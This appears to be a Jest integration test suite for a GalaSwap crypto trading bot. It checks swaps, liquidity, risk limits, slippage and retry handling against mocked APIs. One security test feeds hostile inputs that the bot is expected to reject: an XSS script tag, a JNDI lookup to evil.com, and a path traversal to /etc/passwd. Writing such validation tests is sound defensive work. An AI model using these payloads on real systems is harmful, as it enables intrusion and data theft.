/**
 * End-to-End Integration Tests
 * Tests complete trading workflows with mock APIs
 */

import { TradingEngine } from '../../trading/TradingEngine';
import { GalaSwapClient } from '../../api/GalaSwapClient';
import TestHelpers from '../utils/test-helpers';
import { logger } from '../../utils/logger';
import '../setup';

// Mock external dependencies but allow real internal logic
jest.mock('../../utils/logger');
jest.mock('axios');

// Mock WebSocket
jest.mock('socket.io-client', () => ({
  io: jest.fn(() => ({
    on: jest.fn(),
    emit: jest.fn(),
    disconnect: jest.fn(),
    connected: true
  }))
}));

describe('End-to-End Integration Tests', () => {
  let tradingEngine: TradingEngine;
  let galaSwapClient: GalaSwapClient;
  let config: any;

  beforeEach(() => {
    jest.clearAllMocks();

    // Create test configuration
    config = TestHelpers.createTestBotConfig();

    // Mock axios for HTTP calls
    const axios = require('axios');
    const mockAxiosInstance = {
      create: jest.fn().mockReturnThis(),
      request: jest.fn(),
      interceptors: {
        request: { use: jest.fn() },
        response: { use: jest.fn() }
      }
    };

    axios.create.mockReturnValue(mockAxiosInstance);

    // Setup mock API responses for complete workflow
    mockAxiosInstance.request
      .mockImplementation((config: any) => {
        const { url } = config;

        // Mock different endpoints
        if (url.includes('/quote')) {
          return Promise.resolve({
            data: TestHelpers.createMockQuoteResponse()
          });
        }

        if (url.includes('/swap-payload')) {
          return Promise.resolve({
            data: TestHelpers.createMockApiResponse({
              payload: 'mock-swap-payload',
              signature: 'mock-signature'
            })
          });
        }

        if (url.includes('/bundle')) {
          return Promise.resolve({
            data: TestHelpers.createMockApiResponse('tx-123456')
          });
        }

        if (url.includes('/transaction')) {
          return Promise.resolve({
            data: TestHelpers.createMockTransactionStatus('CONFIRMED')
          });
        }

        if (url.includes('/positions')) {
          return Promise.resolve({
            data: TestHelpers.createMockPositions(config.wallet.address)
          });
        }

        if (url.includes('/health')) {
          return Promise.resolve({
            data: TestHelpers.createMockApiResponse({ status: 'ok' })
          });
        }

        // Default success response
        return Promise.resolve({
          data: TestHelpers.createMockApiResponse({ success: true })
        });
      });

    // Create instances
    galaSwapClient = new GalaSwapClient(TestHelpers.createTestClientConfig());
    tradingEngine = new TradingEngine(config);
  });

  describe('Complete Trading Workflow', () => {
    it('should execute complete swap workflow successfully', async () => {
      // Start the trading engine
      await tradingEngine.start();

      try {
        // Execute a manual trade
        const tradeResult = await tradingEngine.executeManualTrade({
          tokenIn: 'GALA',
          tokenOut: 'USDC',
          amountIn: '1000',
          slippageTolerance: 0.01
        });

        // Verify successful execution
        TestHelpers.validateTradeResult(tradeResult, true);
        expect(tradeResult.transactionId).toBeValidTransactionId();

        // Wait for transaction confirmation
        const txStatus = await galaSwapClient.waitForTransaction(
          tradeResult.transactionId!,
          5000,
          100
        );

        expect(txStatus.data.status).toBe('CONFIRMED');

      } finally {
        await tradingEngine.stop();
      }
    });

    it('should handle complete liquidity provision workflow', async () => {
      await tradingEngine.start();

      try {
        // Add liquidity to a pool
        const liquidityResult = await galaSwapClient.addLiquidity(
          'GALA',
          'USDC',
          3000,
          -276320,
          -276300,
          '500',
          '500'
        );

        expect(liquidityResult.bundleResponse).toBeDefined();
        expect(liquidityResult.transactionId).toBeValidTransactionId();

        // Get positions to verify
        const positions = await galaSwapClient.getUserPositions();
        expect(positions.status).toBe(1);
        expect(Array.isArray((positions.data as any).positions)).toBe(true);

      } finally {
        await tradingEngine.stop();
      }
    });

    it('should handle API failures gracefully', async () => {
      // Mock API failures
      const axios = require('axios');
      const mockAxiosInstance = axios.create.mock.results[0].value;

      mockAxiosInstance.request.mockRejectedValueOnce(new Error('Network timeout'));

      await tradingEngine.start();

      try {
        const tradeResult = await tradingEngine.executeManualTrade({
          tokenIn: 'GALA',
          tokenOut: 'USDC',
          amountIn: '1000'
        });

        TestHelpers.validateTradeResult(tradeResult, false);
        expect(tradeResult.error).toContain('Network timeout');

      } finally {
        await tradingEngine.stop();
      }
    });
  });

  describe('Risk Management Integration', () => {
    it('should prevent trades exceeding position limits', async () => {
      await tradingEngine.start();

      try {
        // Attempt a trade exceeding position limits
        const largeTradeResult = await tradingEngine.executeManualTrade({
          tokenIn: 'GALA',
          tokenOut: 'USDC',
          amountIn: '50000', // Exceeds max position size
          slippageTolerance: 0.01
        });

        TestHelpers.validateTradeResult(largeTradeResult, false);
        expect(largeTradeResult.error).toContain('position');

      } finally {
        await tradingEngine.stop();
      }
    });

    it('should activate emergency stop under critical conditions', async () => {
      await tradingEngine.start();

      // Simulate critical portfolio conditions
      const criticalPortfolio = TestHelpers.createRiskScenarios().criticalRisk;

      // Mock portfolio data
      const axios = require('axios');
      const mockAxiosInstance = axios.create.mock.results[0].value;

      mockAxiosInstance.request.mockImplementation((config: any) => {
        if (config.url.includes('/positions')) {
          return Promise.resolve({
            data: {
              Status: 1,
              Data: { positions: [criticalPortfolio] }
            }
          });
        }
        return Promise.resolve({
          data: TestHelpers.createMockApiResponse({ success: true })
        });
      });

      // Wait for risk assessment
      await TestHelpers.waitFor(1000);

      try {
        // Check if emergency stop was activated
        const riskStatus = tradingEngine.getRiskStatus();
        expect(riskStatus.emergencyStatus.isActive).toBe(true);

        // Verify trades are blocked
        const blockedTradeResult = await tradingEngine.executeManualTrade({
          tokenIn: 'GALA',
          tokenOut: 'USDC',
          amountIn: '100'
        });

        TestHelpers.validateTradeResult(blockedTradeResult, false);
        expect(blockedTradeResult.error).toContain('Emergency stop');

      } finally {
        await tradingEngine.stop();
      }
    });

    it('should handle slippage protection correctly', async () => {
      await tradingEngine.start();

      // Mock high slippage scenario
      const axios = require('axios');
      const mockAxiosInstance = axios.create.mock.results[0].value;

      mockAxiosInstance.request.mockImplementation((config: any) => {
        if (config.url.includes('/quote')) {
          return Promise.resolve({
            data: TestHelpers.createMockApiResponse({
              amountOut: '800', // Lower than expected (high slippage)
              newSqrtPrice: '79228162514264337593543950336',
              priceImpact: 0.15 // 15% slippage
            })
          });
        }
        return Promise.resolve({
          data: TestHelpers.createMockApiResponse({ success: true })
        });
      });

      try {
        const highSlippageResult = await tradingEngine.executeManualTrade({
          tokenIn: 'GALA',
          tokenOut: 'USDC',
          amountIn: '1000',
          slippageTolerance: 0.05 // 5% max slippage
        });

        // Should be rejected due to high slippage
        TestHelpers.validateTradeResult(highSlippageResult, false);
        expect(highSlippageResult.error).toContain('slippage');

      } finally {
        await tradingEngine.stop();
      }
    });
  });

  describe('Strategy Integration', () => {
    beforeEach(async () => {
      await tradingEngine.start();
    });

    afterEach(async () => {
      await tradingEngine.stop();
    });

    it('should execute arbitrage strategy in favorable conditions', async () => {
      // Mock favorable arbitrage conditions
      const arbitrageOpportunity = TestHelpers.createMockArbitrageOpportunity(true);

      // Mock market analysis to return bullish conditions
      const axios = require('axios');
      const mockAxiosInstance = axios.create.mock.results[0].value;

      // Override price responses to create arbitrage opportunity
      mockAxiosInstance.request.mockImplementation((config: any) => {
        if (config.url.includes('/price')) {
          return Promise.resolve({
            data: TestHelpers.createMockApiResponse({
              price: arbitrageOpportunity.routes[0].price,
              volume: '1000000'
            })
          });
        }
        return Promise.resolve({
          data: TestHelpers.createMockApiResponse({ success: true })
        });
      });

      // Use fake timers to trigger trading cycle
      jest.useFakeTimers();

      // Advance time to trigger trading cycle
      jest.advanceTimersByTime(6000);

      // Wait for async operations
      await Promise.resolve();

      // Check trading statistics
      const status = tradingEngine.getStatus();
      expect(status.isRunning).toBe(true);
      expect(status.strategies.arbitrage.isActive).toBe(true);

      jest.useRealTimers();
    });

    it('should pause trading during extreme volatility', async () => {
      // Mock extreme volatility conditions
      const volatileConditions = TestHelpers.createMockMarketConditions('volatile');

      // Mock market analysis
      const mockMarketAnalysis = jest.requireMock('../../monitoring/market-analysis');
      mockMarketAnalysis.MarketAnalysis.mockImplementation(() => ({
        analyzeMarket: jest.fn().mockResolvedValue(volatileConditions),
        isFavorableForTrading: jest.fn().mockReturnValue(false),
        getMarketCondition: jest.fn().mockReturnValue(volatileConditions)
      }));

      jest.useFakeTimers();

      // Trigger trading cycle during volatile conditions
      jest.advanceTimersByTime(6000);
      await Promise.resolve();

      // Verify trading was paused
      expect(logger.warn).toHaveBeenCalledWith(
        expect.stringContaining('Extreme market volatility')
      );

      jest.useRealTimers();
    });
  });

  describe('Portfolio Management Integration', () => {
    beforeEach(async () => {
      await tradingEngine.start();
    });

    afterEach(async () => {
      await tradingEngine.stop();
    });

    it('should provide comprehensive portfolio overview', async () => {
      const portfolio = await tradingEngine.getPortfolio();

      expect(portfolio).toHaveProperty('positions');
      expect(portfolio).toHaveProperty('balances');
      expect(portfolio).toHaveProperty('totalValue');
      expect(portfolio).toHaveProperty('pnl');

      expect(Array.isArray(portfolio.positions)).toBe(true);
      expect(Array.isArray(portfolio.balances)).toBe(true);
      expect(typeof portfolio.totalValue).toBe('number');
      expect(typeof portfolio.pnl).toBe('number');
    });

    it('should track position changes over time', async () => {
      // Get initial portfolio
      // Get initial portfolio (for future comparison)
      await tradingEngine.getPortfolio();

      // Execute a trade
      await tradingEngine.executeManualTrade({
        tokenIn: 'GALA',
        tokenOut: 'USDC',
        amountIn: '100'
      });

      // Get updated portfolio
      const updatedPortfolio = await tradingEngine.getPortfolio();

      // Portfolio should show changes (in a real scenario)
      expect(updatedPortfolio).toBeDefined();
    });
  });

  describe('WebSocket Integration', () => {
    it('should handle real-time price updates', async () => {
      await galaSwapClient.connectWebSocket();

      const priceUpdates: any[] = [];
      const callback = (event: any) => {
        priceUpdates.push(event);
      };

      galaSwapClient.subscribeToTokenPrices(['GALA', 'USDC'], callback);

      // Simulate WebSocket events
      const mockSocket = require('socket.io-client').io.mock.results[0].value;
      const priceUpdateEvent = TestHelpers.createMockWebSocketEvents().priceUpdate;

      // Trigger price update
      mockSocket.on.mock.calls
        .filter(([event]: [string, any]) => event === 'price_update')
        .forEach(([, handler]: [string, any]) => handler(priceUpdateEvent));

      expect(priceUpdates.length).toBeGreaterThan(0);
      expect(priceUpdates[0]).toHaveProperty('type', 'price_update');

      await galaSwapClient.disconnectWebSocket();
    });

    it('should handle transaction status updates', async () => {
      await galaSwapClient.connectWebSocket();

      const transactionUpdates: any[] = [];
      const callback = (event: any) => {
        transactionUpdates.push(event);
      };

      galaSwapClient.subscribeToTransactionUpdates(callback);

      // Simulate transaction update
      const mockSocket = require('socket.io-client').io.mock.results[0].value;
      const txUpdateEvent = TestHelpers.createMockWebSocketEvents().transactionUpdate;

      mockSocket.on.mock.calls
        .filter(([event]: [string, any]) => event === 'transaction_update')
        .forEach(([, handler]: [string, any]) => handler(txUpdateEvent));

      expect(transactionUpdates.length).toBeGreaterThan(0);
      expect(transactionUpdates[0]).toHaveProperty('type', 'transaction_update');

      await galaSwapClient.disconnectWebSocket();
    });
  });

  describe('Error Recovery Integration', () => {
    it('should recover from temporary API failures', async () => {
      await tradingEngine.start();

      const axios = require('axios');
      const mockAxiosInstance = axios.create.mock.results[0].value;

      // Mock temporary failures followed by success
      let callCount = 0;
      mockAxiosInstance.request.mockImplementation(() => {
        callCount++;
        if (callCount <= 2) {
          return Promise.reject(new Error('Temporary failure'));
        }
        return Promise.resolve({
          data: TestHelpers.createMockApiResponse({ success: true })
        });
      });

      try {
        const result = await tradingEngine.executeManualTrade({
          tokenIn: 'GALA',
          tokenOut: 'USDC',
          amountIn: '100'
        });

        // Should succeed after retries
        TestHelpers.validateTradeResult(result, true);
        expect(callCount).toBeGreaterThan(2); // Verify retries occurred

      } finally {
        await tradingEngine.stop();
      }
    });

    it('should handle persistent API failures', async () => {
      await tradingEngine.start();

      const axios = require('axios');
      const mockAxiosInstance = axios.create.mock.results[0].value;

      // Mock persistent failures
      mockAxiosInstance.request.mockRejectedValue(new Error('Persistent API failure'));

      try {
        const result = await tradingEngine.executeManualTrade({
          tokenIn: 'GALA',
          tokenOut: 'USDC',
          amountIn: '100'
        });

        // Should fail after all retries
        TestHelpers.validateTradeResult(result, false);
        expect(result.error).toContain('Persistent API failure');

      } finally {
        await tradingEngine.stop();
      }
    });
  });

  describe('Performance Integration', () => {
    it('should handle concurrent trading requests', async () => {
      await tradingEngine.start();

      try {
        // Execute multiple trades concurrently
        const tradePromises = Array.from({ length: 5 }, (_, i) =>
          tradingEngine.executeManualTrade({
            tokenIn: 'GALA',
            tokenOut: 'USDC',
            amountIn: (100 + i * 10).toString()
          })
        );

        const results = await Promise.all(tradePromises);

        // All trades should complete (success or failure)
        expect(results).toHaveLength(5);
        results.forEach(result => {
          expect(result).toHaveProperty('success');
          expect(typeof result.success).toBe('boolean');
        });

      } finally {
        await tradingEngine.stop();
      }
    });

    it('should maintain performance under load', async () => {
      await tradingEngine.start();

      const startTime = Date.now();
      const iterations = 10;

      try {
        // Execute trades in sequence to measure performance
        for (let i = 0; i < iterations; i++) {
          await tradingEngine.executeManualTrade({
            tokenIn: 'GALA',
            tokenOut: 'USDC',
            amountIn: '100'
          });
        }

        const endTime = Date.now();
        const averageTime = (endTime - startTime) / iterations;

        // Should complete each trade in reasonable time
        expect(averageTime).toBeLessThan(1000); // Less than 1 second per trade

      } finally {
        await tradingEngine.stop();
      }
    });
  });

  describe('Configuration Integration', () => {
    it('should apply configuration changes dynamically', async () => {
      await tradingEngine.start();

      try {
        // Update risk configuration
        const newRiskConfig = {
          positionLimits: { maxPositionSize: 2000 },
          riskMonitor: { riskThreshold: 0.3 },
          emergencyTriggers: { lossLimit: 0.15 }
        };

        tradingEngine.updateRiskConfiguration(newRiskConfig);

        // Verify configuration was applied
        const riskStatus = tradingEngine.getRiskStatus();
        expect(riskStatus).toBeDefined();

        // Test with larger position (should now be allowed)
        const largerTradeResult = await tradingEngine.executeManualTrade({
          tokenIn: 'GALA',
          tokenOut: 'USDC',
          amountIn: '1500' // Between old and new limits
        });

        TestHelpers.validateTradeResult(largerTradeResult, true);

      } finally {
        await tradingEngine.stop();
      }
    });
  });

  describe('Security Integration', () => {
    it('should validate all inputs for security', async () => {
      await tradingEngine.start();

      try {
        // Test with malicious inputs
        const maliciousTradeResult = await tradingEngine.executeManualTrade({
          tokenIn: '<script>alert("xss")</script>',
          tokenOut: '${jndi:ldap://evil.com}',
          amountIn: '../../../etc/passwd'
        });

        // Should be rejected due to input validation
        TestHelpers.validateTradeResult(maliciousTradeResult, false);

      } finally {
        await tradingEngine.stop();
      }
    });

    it('should protect sensitive information in logs', async () => {
      await tradingEngine.start();

      try {
        await tradingEngine.executeManualTrade({
          tokenIn: 'GALA',
          tokenOut: 'USDC',
          amountIn: '100'
        });

        // Verify private key is not logged
        const logCalls = (logger.info as jest.Mock).mock.calls;
        logCalls.forEach(call => {
          const logMessage = JSON.stringify(call);
          expect(logMessage).not.toContain(config.wallet.privateKey);
          expect(logMessage).not.toContain('0123456789'); // Partial private key
        });

      } finally {
        await tradingEngine.stop();
      }
    });
  });
});